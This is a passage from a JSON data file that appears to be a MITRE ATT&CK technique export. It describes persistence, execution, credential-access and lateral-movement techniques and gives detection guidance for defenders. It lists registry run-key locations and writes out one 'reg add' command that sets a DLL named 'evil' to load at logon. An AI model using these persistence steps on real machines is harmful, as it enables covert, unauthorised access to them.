      "detection": "Monitor user account logs as well as 2FA/MFA application logs for suspicious events: unusual login attempt source location, mismatch in location of login attempt and smart device receiving 2FA/MFA request prompts, and high volume of repeated login attempts, all of which may indicate user's primary credentials have been compromised minus 2FA/MFA mechanism. "
    },
    "T1554": {
      "id": "T1554",
      "name": "Compromise Host Software Binary",
      "description": "Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications.\n\nAdversaries may establish persistence though modifications to host software binaries. For example, an adversary may replace or otherwise infect a legitimate application binary (or support files) with a backdoor. Since these binaries may be routinely executed by applications or the user, the adversary can leverage this for persistent access to the host. An adversary may also modify a software binary such as an SSH client in order to persistently collect credentials during logins (i.e., [Modify Authentication Process](https://attack.mitre.org/techniques/T1556)).(Citation: Google Cloud Mandiant UNC3886 2024)\n\nAn adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching)(Citation: Unit42 Banking Trojans Hooking 2022) prior to the binary\u2019s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.(Citation: ESET FontOnLake Analysis 2021)\n\nAfter modifying a binary, an adversary may attempt to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by preventing it from updating (e.g., via the `yum-versionlock` command or `versionlock.list` file in Linux systems that use the yum package manager).(Citation: Google Cloud Mandiant UNC3886 2024)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1554",
      "stix_id": "attack-pattern--960c3c86-1480-4d72-b4e0-8c242e84a5c5",
      "created": "2020-02-11T18:18:34.279000+00:00",
      "modified": "2025-04-15T19:58:52.206000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Deletion",
        "File: File Modification",
        "File: File Metadata",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment. Look for changes to client software that do not correlate with known software or patch cycles. \n\nConsider monitoring for anomalous behavior from client applications, such as atypical module loads, file reads/writes, or network connections."
    },
    "T1552.008": {
      "id": "T1552.008",
      "name": "Chat Messages",
      "description": "Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.\n\nRather than accessing the stored chat logs (i.e., [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation (Citation: Slack Security Risks).",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1552.008",
      "stix_id": "attack-pattern--9664ad0e-789e-40ac-82e2-d7b17fbe8fb3",
      "created": "2023-03-14T14:38:03.673000+00:00",
      "modified": "2025-04-15T21:56:22.979000+00:00",
      "platforms": [
        "SaaS",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1059.001": {
      "id": "T1059.001",
      "name": "PowerShell",
      "description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1059.001",
      "stix_id": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736",
      "created": "2020-03-09T13:48:55.078000+00:00",
      "modified": "2025-04-15T19:58:52.378000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Script: Script Execution",
        "Process: Process Creation",
        "Process: Process Metadata",
        "Command: Command Execution",
        "Module: Module Load"
      ],
      "defense_bypassed": [],
      "detection": "If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nMonitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.\n\nConsider monitoring for Windows event ID (EID) 400, which shows the version of PowerShell executing in the <code>EngineVersion</code> field (which may also be relevant to detecting a potential [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)) as well as if PowerShell is running locally or remotely in the <code>HostName</code> field. Furthermore, EID 400 may indicate the start time and EID 403 indicates the end time of a PowerShell session.(Citation: inv_ps_attacks)"
    },
    "T1546.001": {
      "id": "T1546.001",
      "name": "Change Default File Association",
      "description": "Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.(Citation: Microsoft Change Default Programs)(Citation: Microsoft File Handlers)(Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n\nSystem file associations are listed under <code>HKEY_CLASSES_ROOT\\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command</code>. For example: \n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.(Citation: TrendMicro TROJ-FAKEAV OCT 2012)",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546.001",
      "stix_id": "attack-pattern--98034fef-d9fb-4667-8dc4-2eab6231724c",
      "created": "2020-01-24T13:40:47.282000+00:00",
      "modified": "2025-04-15T19:58:52.605000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "Windows Registry: Windows Registry Key Modification"
      ],
      "defense_bypassed": [],
      "detection": "Collect and analyze changes to Registry keys that associate file extensions to default applications for execution and correlate with unknown process launch activity or unusual file types for that process.\n\nUser file association preferences are stored under <code> [HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts</code> and override associations configured under <code>[HKEY_CLASSES_ROOT]</code>. Changes to a user's preference will occur under this entry's subkeys.\n\nAlso look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques."
    },
    "T1055.014": {
      "id": "T1055.014",
      "name": "VDSO Hijacking",
      "description": "Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009)(Citation: Backtrace VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1055.014",
      "stix_id": "attack-pattern--98be40f2-c86b-4ade-b6fc-4964932040e5",
      "created": "2020-01-14T01:35:00.781000+00:00",
      "modified": "2025-04-15T19:58:52.691000+00:00",
      "platforms": [
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Module: Module Load"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for malicious usage of system calls, such as ptrace and mmap, that can be used to attach to, manipulate memory, then redirect a processes' execution path. Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)(Citation: GNU Acct)(Citation: RHEL auditd)(Citation: Chokepoint preload rootkits) \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. "
    },
    "T1071.002": {
      "id": "T1071.002",
      "name": "File Transfer Protocols",
      "description": "Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMB(Citation: US-CERT TA18-074A), FTP(Citation: ESET Machete July 2019), FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1071.002",
      "stix_id": "attack-pattern--9a60a291-8960-4387-8a4a-2ab5c18bb50b",
      "created": "2020-03-15T16:16:25.763000+00:00",
      "modified": "2025-04-15T19:58:52.946000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.(Citation: University of Birmingham C2)"
    },
    "T1212": {
      "id": "T1212",
      "name": "Exploitation for Credential Access",
      "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1212",
      "stix_id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-15T22:30:06.288000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Authentication",
        "Process: Process Creation",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. Credential resources obtained through exploitation may be detectable in use if they are not normally used or seen."
    },
    "T1546.014": {
      "id": "T1546.014",
      "name": "Emond",
      "description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.\n\nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)\n\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546.014",
      "stix_id": "attack-pattern--9c45eaa3-8604-4780-8988-b5074dbb9ecd",
      "created": "2020-01-24T15:15:13.426000+00:00",
      "modified": "2025-04-16T20:37:18.374000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Command: Command Execution",
        "Process: Process Creation",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor emond rules creation by checking for files created or modified in <code>/etc/emond.d/rules/</code> and <code>/private/var/db/emondClients</code>."
    },
    "T1102.003": {
      "id": "T1102.003",
      "name": "One-Way Communication",
      "description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1102.003",
      "stix_id": "attack-pattern--9c99724c-a483-4d60-ad9d-7f004e42e8e8",
      "created": "2020-03-14T22:45:52.963000+00:00",
      "modified": "2025-04-25T14:47:30.432000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows. User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)"
    },
    "T1590": {
      "id": "T1590",
      "name": "Gather Victim Network Information",
      "description": "Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1590",
      "stix_id": "attack-pattern--9d48cab2-7929-4812-ad22-f536665f0109",
      "created": "2020-10-02T15:45:17.628000+00:00",
      "modified": "2025-04-15T22:38:13.461000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1210": {
      "id": "T1210",
      "name": "Exploitation of Remote Services",
      "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB(Citation: CIS Multiple SMB Vulnerabilities) and RDP(Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL(Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Additionally, there have been a number of vulnerabilities in VMware vCenter installations, which may enable threat actors to move laterally from the compromised vCenter server to virtual machines or even to ESXi hypervisors.(Citation: Broadcom VMSA-2024-0019)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
      "tactic": "lateral-movement",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1210",
      "stix_id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-15T19:58:53.590000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of [Discovery](https://attack.mitre.org/tactics/TA0007), or other unusual network traffic that may indicate additional tools transferred to the system."
    },
    "T1534": {
      "id": "T1534",
      "name": "Internal Spearphishing",
      "description": "After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporating [Impersonation](https://attack.mitre.org/techniques/T1656).(Citation: Trend Micro - Int SP)\n\nFor example, adversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic login interfaces.\n\nAdversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials.(Citation: Int SP - chat apps)",
      "tactic": "lateral-movement",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1534",
      "stix_id": "attack-pattern--9e7452df-5144-4b6e-b04a-b66dd4016747",
      "created": "2019-09-04T19:26:12.441000+00:00",
      "modified": "2025-04-15T22:42:40.610000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux",
        "SaaS",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "Network intrusion detection systems and email gateways usually do not scan internal email, but an organization can leverage the journaling-based solution which sends a copy of emails to a security service for offline analysis or incorporate service-integrated solutions using on-premise or API-based integrations to help detect internal spearphishing campaigns.(Citation: Trend Micro When Phishing Starts from the Inside 2017)"
    },
    "T1574.010": {
      "id": "T1574.010",
      "name": "Services File Permissions Weakness",
      "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1574.010",
      "stix_id": "attack-pattern--9e8b28c9-35fe-48ac-a14d-e6cc032dcbcd",
      "created": "2020-03-12T20:43:53.998000+00:00",
      "modified": "2025-04-25T14:47:32.419000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "File: File Creation",
        "Process: Process Creation",
        "Service: Service Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques. "
    },
    "T1547.001": {
      "id": "T1547.001",
      "name": "Registry Run Keys / Startup Folder",
      "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1547.001",
      "stix_id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
      "created": "2020-01-23T22:02:48.566000+00:00",
      "modified": "2025-04-15T19:58:54.099000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Modification",
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Creation",
        "Windows Registry: Windows Registry Key Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement."
    },
    "T1199": {
      "id": "T1199",
      "name": "Trusted Relationship",
